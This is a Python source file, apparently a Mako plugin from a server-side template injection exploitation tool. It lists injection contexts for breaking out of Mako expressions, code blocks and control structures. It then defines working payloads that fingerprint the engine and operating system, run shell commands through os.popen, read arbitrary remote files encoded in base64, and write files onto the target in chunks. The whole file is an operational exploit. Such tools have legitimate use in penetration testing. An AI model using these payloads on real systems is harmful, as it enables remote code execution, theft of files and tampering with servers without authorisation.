from utils.strings import quote, chunkit, md5
from core.check import Check
from utils.loggers import log
from utils import rand
import base64


class Mako(Check):

    render_tag = '${%(payload)s}'
    header_tag = '${%(header)s}'
    trailer_tag = '${%(trailer)s}'
    contexts = [
        # Normal reflecting tag ${}

        # This covers ${%s}
        { 'level': 1, 'prefix': '1}', 'suffix' : '' },
        # ${'%s'}
        { 'level': 2, 'prefix': '1\'}', 'suffix' : '' },
        # ${"%s"}
        { 'level': 2, 'prefix': '1"}', 'suffix' : '' },
        # ${"""%s"""}
        { 'level': 2, 'prefix': '1"""}', 'suffix' : '' },
        # ${(%s)}
        { 'level': 3, 'prefix': '1)}', 'suffix' : '' },
        # ${('%s')}
        { 'level': 3, 'prefix': '1\')}', 'suffix' : '' },
        # ${("%s")}
        { 'level': 3, 'prefix': '1")}', 'suffix' : '' },
        # ${("""%s""")}
        { 'level': 3, 'prefix': '1""")}', 'suffix' : '' },
        # ${[%s]}
        { 'level': 4, 'prefix': '1]}', 'suffix' : '' },
        # ${['%s']}
        { 'level': 4, 'prefix': '1\']}', 'suffix' : '' },
        # ${["%s"]}
        { 'level': 4, 'prefix': '1"]}', 'suffix' : '' },
        # ${["""%s"""]}
        { 'level': 4, 'prefix': '1"""]}', 'suffix' : '' },
        # ${([%s])}
        { 'level': 4, 'prefix': '1])}', 'suffix' : '' },
        # ${(['%s'])}
        { 'level': 4, 'prefix': '1\'])}', 'suffix' : '' },
        # ${(["%s"])}
        { 'level': 4, 'prefix': '1"])}', 'suffix' : '' },
        # ${(["""%s"""])}
        { 'level': 4, 'prefix': '1"""])}', 'suffix' : '' },

        # This covers ${{%s}}
        { 'level': 5, 'prefix': '1:1}}', 'suffix' : '' },
        # This covers ${{'%s':1}}
        { 'level': 5, 'prefix': '1\':1}}', 'suffix' : '' },
        # This covers ${{"%s":1}}
        { 'level': 5, 'prefix': '1":1}}', 'suffix' : '' },
        # This covers ${{"""%s""":1}}
        { 'level': 5, 'prefix': '1""":1}}', 'suffix' : '' },
        # This covers ${{1:%s}}
        { 'level': 5, 'prefix': '1}}', 'suffix' : '' },
        # This covers ${{1:'%s'}}
        { 'level': 5, 'prefix': '1\'}}', 'suffix' : '' },
        # This covers ${{:"%s"}}
        { 'level': 5, 'prefix': '1"}}', 'suffix' : '' },
        # This covers ${{1:"""%s"""}}
        { 'level': 5, 'prefix': '1"""}}', 'suffix' : '' },


        # Code blocks
        # This covers <% %s %>, <%! %s %>, <% %s=1 %>
        { 'level': 1, 'prefix': '%>', 'suffix' : '<%#' },
        # This covers <% a=%s %>
        { 'level': 2, 'prefix': '1%>', 'suffix' : '<%#' },
        # This covers <% a='%s' %>
        { 'level': 2, 'prefix': '1\'%>', 'suffix' : '<%#' },
        # This covers <% a="%s" %>
        { 'level': 2, 'prefix': '1"%>', 'suffix' : '<%#' },
        # This covers <% a="""%s""" %>
        { 'level': 2, 'prefix': '1"""%>', 'suffix' : '<%#' },
        # <% a=range(%s) %>
        { 'level': 3, 'prefix': '1)%>', 'suffix' : '<%#' },
        # <% a=''.join('%s') %>
        { 'level': 3, 'prefix': '1\')%>', 'suffix' : '<%#' },
        # <% a=''.join("%s") %>
        { 'level': 3, 'prefix': '1")%>', 'suffix' : '<%#' },
        # <% a=''.join("""%s""") %>
        { 'level': 3, 'prefix': '1""")%>', 'suffix' : '<%#' },

        # This covers <% [%s] %>, <%! [%s] %>, <% [%s]=1 %> <% a=[%s] %>
        { 'level': 4, 'prefix': '1]%>', 'suffix' : '<%#' },
        # This covers <% a=['%s'] %>
        { 'level': 4, 'prefix': '1\']%>', 'suffix' : '<%#' },
        # This covers <% a=["%s"] %>
        { 'level': 4, 'prefix': '1"]%>', 'suffix' : '<%#' },
        # This covers <% a=["""%s"""] %>
        { 'level': 4, 'prefix': '1"""]%>', 'suffix' : '<%#' },
        # <% a=set([%s]) %>
        { 'level': 4, 'prefix': '1])%>', 'suffix' : '<%#' },
        # <% a=set(['%s']) %>
        { 'level': 4, 'prefix': '1\'])%>', 'suffix' : '<%#' },
        # <% a=set(["%s"]) %>
        { 'level': 4, 'prefix': '1"])%>', 'suffix' : '<%#' },
        # <% a=set(["""%s"""]) %>
        { 'level': 4, 'prefix': '1"""])%>', 'suffix' : '<%#' },

        # This covers <% {%s} %>, <%! {%s} %>, <% {%s}=1 %> <% a={%s} %>
        { 'level': 5, 'prefix': '1:1}%>', 'suffix' : '<%#' },
        # This covers <% a={'%s':1} %>
        { 'level': 5, 'prefix': '1\':1}%>', 'suffix' : '<%#' },
        # This covers <% a={"%s":1} %>
        { 'level': 5, 'prefix': '1":1}%>', 'suffix' : '<%#' },
        # This covers <% a={"""%s""":1} %>
        { 'level': 5, 'prefix': '1""":1}%>', 'suffix' : '<%#' },
        # This covers <% a={1:%s} %>
        { 'level': 5, 'prefix': '1}%>', 'suffix' : '<%#' },
        # This covers <% a={1:'%s'} %>
        { 'level': 5, 'prefix': '1\'}%>', 'suffix' : '<%#' },
        # This covers <% a={1:"%s"} %>
        { 'level': 5, 'prefix': '1"}%>', 'suffix' : '<%#' },
        # This covers <% a={1:"""%s"""} %>
        { 'level': 5, 'prefix': '1"""}%>', 'suffix' : '<%#' },

        # If and for blocks
        # % if %s:\n% endif
        # % for a in %s:\n% endfor
        # % if %s==1:\n% endif
        { 'level': 2, 'prefix': '\'a\':#\n', 'suffix' : '\n' },
        # % if '%s'=='':\n% endif
        { 'level': 2, 'prefix': 'a\':#\n', 'suffix' : '\n' },
        # % if "%s"=='':\n% endif
        { 'level': 2, 'prefix': 'a":#\n', 'suffix' : '\n' },
        # % if """%s"""=='':\n% endif
        { 'level': 2, 'prefix': 'a""":#\n', 'suffix' : '\n' },
        # % if (%s)==1:\n% endif
        { 'level': 3, 'prefix': '\'a\'):#\n', 'suffix' : '\n' },
        # % if ('%s')=='':\n% endif
        { 'level': 3, 'prefix': 'a\'):#\n', 'suffix' : '\n' },
        # % if ("%s")=='':\n% endif
        { 'level': 3, 'prefix': 'a"):#\n', 'suffix' : '\n' },
        # % if ("""%s""")=='':\n% endif
        { 'level': 3, 'prefix': 'a"""):#\n', 'suffix' : '\n' },
        # % if [%s]:\n% endif
        # % for a in [%s]:\n% endfor
        # % if [%s]==1:\n% endif
        { 'level': 4, 'prefix': '\'a\']:#\n', 'suffix' : '\n' },
        # % if '%s'=='':\n% endif
        { 'level': 4, 'prefix': 'a\']:#\n', 'suffix' : '\n' },
        # % if "%s"=='':\n% endif
        { 'level': 4, 'prefix': 'a"]:#\n', 'suffix' : '\n' },
        # % if """%s"""=='':\n% endif
        { 'level': 4, 'prefix': 'a"""]:#\n', 'suffix' : '\n' },
        # % if (%s)==1:\n% endif
        { 'level': 4, 'prefix': '\'a\']):#\n', 'suffix' : '\n' },
        # % if ('%s')=='':\n% endif
        { 'level': 4, 'prefix': 'a\']):#\n', 'suffix' : '\n' },
        # % if ("%s")=='':\n% endif
        { 'level': 4, 'prefix': 'a"]):#\n', 'suffix' : '\n' },
        # % if ("""%s""")=='':\n% endif
        { 'level': 4, 'prefix': 'a"""]):#\n', 'suffix' : '\n' },


        # If and for blocks
        # % if {%s}:\n% endif
        # % for a in {%s}:\n% endfor
        # % if {%s}==1:\n% endif
        { 'level': 5, 'prefix': '1:1}:#\n', 'suffix' : '\n' },
        # % if {'%s':1}=='':\n% endif
        { 'level': 5, 'prefix': 'a\':1}:#\n', 'suffix' : '\n' },
        # % if {"%s":1}=='':\n% endif
        { 'level': 5, 'prefix': 'a":1}:#\n', 'suffix' : '\n' },
        # % if {"""%s""":1}=='':\n% endif
        { 'level': 5, 'prefix': 'a""":1}:#\n', 'suffix' : '\n' },
        # % if {1:%s}=='':\n% endif
        { 'level': 5, 'prefix': '1}:#\n', 'suffix' : '\n' },
        # % if {1:'%s'}=='':\n% endif
        { 'level': 5, 'prefix': 'a\'}:#\n', 'suffix' : '\n' },
        # % if {1:%s"}=='':\n% endif
        { 'level': 5, 'prefix': 'a"}:#\n', 'suffix' : '\n' },
        # % if {1:"""%s"""}=='':\n% endif
        { 'level': 5, 'prefix': 'a"""}:#\n', 'suffix' : '\n' },

        # Mako blocks
        #{ 'level': 2, 'prefix' : '"/>', 'suffix' : ''},
        { 'level': 5, 'prefix' : '</%doc>', 'suffix' : '<%doc>'},
        { 'level': 5, 'prefix' : '</%doc>', 'suffix' : '<%doc>' },
        #{ 'level': 5, 'prefix' : '</%def>', 'suffix' : '<%def name="t(x)">' },
        { 'level': 5, 'prefix' : '</%block>', 'suffix' : '<%block>' },
        { 'level': 5, 'prefix' : '</%text>', 'suffix' : '<%text>'},

    ]

    def detect_engine(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '${"%s".join("%s")}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.inject(payload):
            self.set('language', 'python')
            self.set('engine', 'mako')
            self.set('eval', 'python')

    def detect_eval(self):

        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
        self.set('eval', 'python')
        self.set('os', self.inject(payload))

    def evaluate(self, code):
        return self.inject('<%% %s %%>' % (code))

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        return self.inject("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))


    def detect_read(self):
        self.set('read', True)

    def _md5(self, remote_path):
        execution_code = """<%% x=__import__("hashlib").md5(open("%s", 'rb').read()).hexdigest() %%>${x}""" % (remote_path)

        return self.inject(execution_code)

    def read(self, remote_path):

        # Get remote file md5
        md5_remote = self._md5(remote_path)

        if not md5_remote:
            log.warn('Error getting remote file md5, check presence and permission')
            return

        data_b64encoded = self.inject("""<%% x=__import__("base64").b64encode(open("%s", "rb").read()) %%>${x}""" %  remote_path)
        data = base64.b64decode(data_b64encoded)

        if not md5(data) == md5_remote:
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File downloaded correctly')

        return data

    def detect_write(self):
        self.set('write', True)

    def write(self, data, remote_path):

        # Check existance and overwrite with --force-overwrite
        if self._md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                log.warn('Remote path already exists, use --force-overwrite for overwrite')
                return
            else:
                self.evaluate("""open("%s", 'w').close()""" % remote_path)

        # Upload file in chunks of 500 characters
        for chunk in chunkit(data, 500):

            chunk_b64 = base64.urlsafe_b64encode(chunk)
            self.evaluate("""open("%s", 'ab+').write(__import__("base64").urlsafe_b64decode('%s'))""" % (remote_path, chunk_b64))

        if not md5(data) == self._md5(remote_path):
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.warn('File uploaded correctly')
